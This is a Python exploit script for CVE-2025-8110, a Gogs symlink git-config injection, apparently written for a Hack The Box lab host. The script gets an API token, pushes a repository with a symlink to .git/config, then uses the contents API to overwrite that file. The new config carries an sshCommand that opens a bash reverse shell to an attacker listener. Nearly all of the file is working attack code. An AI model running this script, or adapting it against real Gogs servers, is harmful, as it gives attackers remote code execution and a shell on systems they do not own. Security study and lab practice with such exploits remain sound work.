#!/usr/bin/env python3
"""CVE-2025-8110 - Gogs Symlink Git Config Injection RCE"""

import requests
import subprocess
import tempfile
import os
import sys
import base64
import argparse

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-8110 Gogs RCE')
    parser.add_argument('-u', '--url', required=True, help='Gogs URL')
    parser.add_argument('-lh', '--lhost', required=True, help='Listener host')
    parser.add_argument('-lp', '--lport', required=True, help='Listener port')
    parser.add_argument('--username', default='user1')
    parser.add_argument('--password', default='Meta@1!')
    parser.add_argument('--token', default=None, help='Gogs API token')
    args = parser.parse_args()

    GOGS_URL = args.url.rstrip('/')
    HOST = "staging-v2-code.dev.silentium.htb"
    REPO = "pwn-repo"

    s = requests.Session()
    s.headers.update({"Host": HOST})

    # Authenticate
    if not args.token:
        r = s.post(f"{GOGS_URL}/api/v1/users/{args.username}/tokens",
                    auth=(args.username, args.password),
                    json={"name": "pwn-token"})
        token = r.json()["sha1"]
    else:
        token = args.token

    print(f"[+] Authenticated successfully")
    print(f"[+] Application token: {token}")
    s.headers.update({"Authorization": f"token {token}"})

    # Create repo
    r = s.post(f"{GOGS_URL}/api/v1/user/repos",
               json={"name": REPO, "private": False, "auto_init": False})
    print(f"    Repo creation status: {r.status_code}")

    # Build local repo with symlink
    work = tempfile.mkdtemp()
    os.chdir(work)
    subprocess.run(["git", "init"], capture_output=True)
    subprocess.run(["git", "config", "user.email", "user1@silentium.htb"], capture_output=True)
    subprocess.run(["git", "config", "user.name", "user1"], capture_output=True)

    os.symlink(".git/config", os.path.join(work, "symlink"))
    open(os.path.join(work, "README.md"), "w").write("x\n")
    subprocess.run(["git", "add", "-A"], capture_output=True)
    subprocess.run(["git", "commit", "-m", "init"], capture_output=True)

    push_url = f"http://{args.username}:{args.password}@127.0.0.1:3001/{args.username}/{REPO}.git"
    subprocess.run(["git", "push", push_url, "master", "--force"],
                   capture_output=True, env={**os.environ, "GIT_TERMINAL_PROMPT": "0"})
    print("[+] Symlink pushed")

    # Get file SHA
    r = s.get(f"{GOGS_URL}/api/v1/repos/{args.username}/{REPO}/contents/symlink")
    sha = r.json()["sha"]

    # Malicious .git/config with reverse shell sshCommand
    config = f"""[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
\tsshCommand = bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'
[remote "origin"]
\turl = ssh://localhost/x
\tfetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
\tremote = origin
\tmerge = refs/heads/master
"""

    # Overwrite .git/config via symlink
    r = s.put(f"{GOGS_URL}/api/v1/repos/{args.username}/{REPO}/contents/symlink",
              json={"content": base64.b64encode(config.encode()).decode(),
                    "message": "update", "sha": sha})
    print(f"[+] Exploit sent, check your listener!")

if __name__ == "__main__":
    main()
